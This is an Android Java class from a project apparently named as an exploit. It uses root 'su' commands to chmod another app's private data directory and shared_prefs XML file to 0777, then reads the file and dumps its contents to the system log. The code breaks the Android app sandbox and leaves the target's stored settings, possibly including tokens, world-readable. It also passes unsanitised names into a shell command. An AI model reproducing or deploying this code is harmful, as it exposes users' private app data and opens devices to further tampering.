package com.hanks.android.fypapplication_exploit;

import android.content.SharedPreferences;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;


public class SharedPreferencesReader {

    private static final String APPLICATIONS_PATH = "/data/data/";
    private static final String SHARED_PREFS = "/shared_prefs";

    protected static String readFile(String packageName, String ApplicationName) {
        final String PROJECT_PATH = APPLICATIONS_PATH + packageName;
        final String XML_FILE = "/" + ApplicationName + ".xml";
        try {
            Process proc = Runtime.getRuntime().exec("su -c chmod 0777 " + PROJECT_PATH);
            proc.waitFor();
            proc = Runtime.getRuntime().exec("su -c chmod 0777 " + PROJECT_PATH + SHARED_PREFS);
            proc.waitFor();
            proc = Runtime.getRuntime().exec("su -c chmod 0777 " + PROJECT_PATH + SHARED_PREFS + XML_FILE);
            proc.waitFor();
            File prefsFile = new File(PROJECT_PATH + SHARED_PREFS + XML_FILE);
            StringBuilder prefsBuilder = new StringBuilder();
            BufferedReader br = new BufferedReader(new FileReader(prefsFile));
            String readline;
            do {
                readline = br.readLine();
                prefsBuilder.append(readline);
                prefsBuilder.append('\n');
            } while(readline != null);
            br.close();
            String prefs = prefsBuilder.toString();
            Log.i(SharedPreferences.class.getName(),prefs);
            return prefs;

        } catch (Exception e) {
            Log.i(SharedPreferences.class.getName(), "Operation failed, ");
            e.printStackTrace();
            return null;
        }
    }
}
